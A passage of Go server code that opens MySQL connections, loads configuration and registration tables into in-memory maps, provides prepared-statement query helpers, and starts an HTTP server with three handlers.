	dbLog.SetMaxOpenConns(20)
	dbLog.SetMaxIdleConns(10)
	dbLog.Ping()
	err := dbLog.Ping()
	if err != nil {
		log.Fatal(err)
	}
	dbConfig, _ = sql.Open("mysql", config.DbConfig.UserName+":"+config.DbConfig.Password+"@tcp("+config.DbConfig.ServerAddress+":"+fmt.Sprintf("%d", config.DbConfig.Port)+")/"+config.DbConfig.Database+"?charset=utf8")
	dbConfig.SetMaxOpenConns(20)
	dbConfig.SetMaxIdleConns(10)
	dbConfig.Ping()
	err = dbConfig.Ping()
	if err != nil {
		log.Fatal(err)
	}
	loadGlobalConfigFromDb()
	go timerReload()
	log.Println("init end on:" + config.Port)
}

func loadGlobalConfigFromDb() {
	resultArray, _ := fetchRows(dbConfig, "SELECT * FROM system_configs")
	// map1 := make(map[string]string)
	// for index := 0; index < len(*resultArray); index++ {
	// 	(*mapConfig)[(*resultArray)[index]["title"]] = (*resultArray)[index]["detail"]
	// }
	for _, value := range *resultArray {
		mapConfig.Store(value["title"], value["detail"])
		// mapConfig[value["title"]] = value["detail"]
	}
	// log.Println(mapConfig)
	targetArray, _ := fetchRows(dbConfig, "SELECT * FROM register_targets")
	for _, target := range *targetArray {
		//todo:add count
		// if vi, ok := mapRegisterTargetConfig.Load(target["apid"]); ok {
		// 	procTargetPrepareCount(vi, target)
		// }
		mapRegisterTargetConfig.Store(target["apid"], target)
	}
	channelArray, _ := fetchRows(dbConfig, "SELECT * FROM register_channels")
	for _, channel := range *channelArray {
		// mapRegisterChannelConfig[channel["apid"]] = channel
		mapRegisterChannelConfig.Store(channel["aid"], channel)
	}
	// log.Println("loadGlobalConfigFromDb done")
}

// func procTargetPrepareCount(fromMem map[string]string, fromDb map[string]string) {
// 	ratio, _ := strconv.ParseInt(v.(string), 10, 64)
// 	lastPrepareUpdateFromDb = fromDb["lastPrepareUpdate"]
//  	if ()
// }

func loadFileConfig() bool {
	f, err := ioutil.ReadFile("config.json")
	if err != nil {
		log.Println("load config error: ", err)
		return false
	}

	//不同的配置规则，解析复杂度不同
	temp := new(DbConfigs)
	err = json.Unmarshal(f, &temp)
	if err != nil {
		log.Println("Para config failed: ", err)
		return false
	}

	configLock.Lock()
	config = temp
	configLock.Unlock()
	return true
}

func checkErr(err error) {
	if err != nil {
		panic(err)
	}
}

//插入
func insert(db *sql.DB, sqlstr string, args ...interface{}) (int64, error) {
	stmtIns, err := db.Prepare(sqlstr)
	if err != nil {
		panic(err.Error())
	}
	// defer stmtIns.Close()

	result, err := stmtIns.Exec(args...)
	if err != nil {
		panic(err.Error())
	}
	stmtIns.Close()
	return result.LastInsertId()
}

//修改和删除
func exec(db *sql.DB, sqlstr string, args ...interface{}) (int64, error) {
	stmtIns, err := db.Prepare(sqlstr)
	if err != nil {
		panic(err.Error())
	}
	// defer stmtIns.Close()

	result, err := stmtIns.Exec(args...)
	if err != nil {
		panic(err.Error())
	}
	stmtIns.Close()
	return result.RowsAffected()
}

//取一行数据，注意这类取出来的结果都是string
func fetchRow(db *sql.DB, sqlstr string, args ...interface{}) (*map[string]string, error) {
	stmtOut, err := db.Prepare(sqlstr)
	if err != nil {
		panic(err.Error())
	}
	// defer stmtOut.Close()

	rows, err := stmtOut.Query(args...)
	if err != nil {
		panic(err.Error())
	}

	columns, err := rows.Columns()
	if err != nil {
		panic(err.Error())
	}

	values := make([]sql.RawBytes, len(columns))
	scanArgs := make([]interface{}, len(values))
	ret := make(map[string]string, len(scanArgs))

	for i := range values {
		scanArgs[i] = &values[i]
	}
	for rows.Next() {
		err = rows.Scan(scanArgs...)
		if err != nil {
			panic(err.Error())
		}
		var value string

		for i, col := range values {
			if col == nil {
				value = "NULL"
			} else {
				value = string(col)
			}
			ret[columns[i]] = value
		}
		break //get the first row only
	}
	rows.Close()
	stmtOut.Close()
	return &ret, nil
}

//取多行,注意这类取出来的结果都是string
func fetchRows(db *sql.DB, sqlstr string, args ...interface{}) (*[]map[string]string, error) {
	stmtOut, err := db.Prepare(sqlstr)
	if err != nil {
		panic(err.Error())
	}
	// defer stmtOut.Close()

	rows, err := stmtOut.Query(args...)
	if err != nil {
		panic(err.Error())
	}

	columns, err := rows.Columns()
	if err != nil {
		panic(err.Error())
	}

	values := make([]sql.RawBytes, len(columns))
	scanArgs := make([]interface{}, len(values))

	ret := make([]map[string]string, 0)
	for i := range values {
		scanArgs[i] = &values[i]
	}

	for rows.Next() {
		err = rows.Scan(scanArgs...)
		if err != nil {
			panic(err.Error())
		}
		var value string
		vmap := make(map[string]string, len(scanArgs))
		for i, col := range values {
			if col == nil {
				value = "NULL"
			} else {
				value = string(col)
			}
			vmap[columns[i]] = value
		}
		ret = append(ret, vmap)
	}
	rows.Close()
	stmtOut.Close()
	return &ret, nil
}

func main() {
	defer func() {
		if err := recover(); err != nil {
			log.Println("error begin:")
			log.Println(err) // 这里的err其实就是panic传入的内容，55
			log.Println("error end:")
		}
	}()

	server := &http.Server{
		Addr:         ":" + config.Port,
		ReadTimeout:  16 * time.Second,
		WriteTimeout: 16 * time.Second,
	}
	http.HandleFunc("/ss/sendc", sendC)
	http.HandleFunc("/ss/getc", getC)
	http.HandleFunc("/ss/testc", testC)
	server.ListenAndServe()
	log.Println((*server).ReadTimeout)

	// server := http.ListenAndServe(":8090", nil)
	// log.Println(server.ReadTimeout)
}
